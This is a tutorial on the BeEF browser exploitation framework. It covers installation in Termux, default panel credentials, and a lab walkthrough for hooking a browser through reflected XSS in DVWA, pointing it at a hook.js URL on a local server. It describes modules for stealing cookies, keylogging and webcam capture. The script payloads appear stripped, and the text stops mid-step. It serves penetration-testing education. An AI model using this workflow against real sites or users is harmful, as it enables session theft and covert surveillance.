BeEF (Browser Exploitation Framework)

BeEF (Browser Exploitation Framework) is an open-source penetration testing tool developed by Wade Alcorn and maintained by the BeEF project community. It focuses on client-side attacks by "hooking" web browsers through cross-site scripting (XSS), malicious links, or social engineering vectors. Once a browser is hooked, BeEF provides a powerful command-and-control interface to execute JavaScript modules, fingerprint the browser/environment, steal session cookies, access WebRTC/camera/microphone (with permission), perform keylogging, exploit browser vulnerabilities, and demonstrate the impact of client-side compromise. BeEF is widely used in authorized red team engagements to evaluate browser security, XSS impact, and user interaction with malicious content.

Uses

BeEF is employed in ethical penetration testing to simulate real-world browser-based attacks, assess the effectiveness of XSS mitigations, demonstrate the dangers of reflected/stored XSS, and evaluate endpoint/user awareness. Example: Hooking a test browser via an injected XSS payload in a vulnerable web application, then using BeEF modules to extract session tokens, capture keystrokes, or deliver further payloads in a controlled lab environment.

Installation in Termux

BeEF is Ruby-based and runs as a web server. It installs cleanly in Termux with Ruby, Bundler, and network dependencies. Steps:

pkg update && pkg upgrade -y
pkg install git ruby build-essential libsqlite-dev libreadline-dev libssl-dev -y
gem install bundler
git clone https://github.com/beefproject/beef.git
cd beef
bundle install
# Optional: Edit config.yaml (default bind to 0.0.0.0:3000, change hook URL if needed)
# Launch: ./beef
# Access UI: http://localhost:3000/ui/panel (or your Termux IP:3000 from another device)

Common issues: Port 3000 blocked—edit config.yaml to use another port; Ruby gem errors—run bundle update or install missing native extensions; external hooking—ensure Termux device IP is reachable on the network. To uninstall: Remove the beef directory. For production testing, use a Linux VM or desktop for stability and better network reachability.

Functions and Walkthroughs

Start BeEF: ./beef. Access control panel at http://:3000/ui/panel (default credentials: beef/beef). Hook a browser: Include the hook.js script in a vulnerable page () or send a malicious link. Once hooked, the browser appears as a "zombie" in the UI. Execute modules: Right-click zombie → Commands → Select category (Browser, Social Engineering, Exploits, etc.) → Choose module (e.g., Get Cookie, Keylogger, Webcam Snap). Monitor results in real time. Always test in isolated labs with explicit permission.

Detailed Tutorial: Browser Hooking via Reflected XSS (Ethical Lab Scenario)

This tutorial demonstrates using BeEF to hook a browser via a reflected XSS vulnerability in a deliberately vulnerable test application (e.g., DVWA, bWAPP, or a custom lab page you own). This procedure is permitted only in authorized environments with explicit written permission. Unauthorized XSS exploitation or browser hooking is illegal.

  1. Start BeEF server: In Termux, navigate to the beef directory and run ./beef. Note the hook URL (e.g., http://192.168.1.50:3000/hook.js) and UI access (http://192.168.1.50:3000/ui/panel).
  2. Prepare vulnerable target: Deploy a test application with a reflected XSS vulnerability (e.g., DVWA set to Low security → XSS (Reflected) page). Confirm the parameter (e.g., ?name=) reflects input unsanitized.
  3. Craft XSS payload: Use a simple script tag that loads BeEF hook: URL example: http://target-ip/dvwa/vulnerabilities/xss_r/?name=
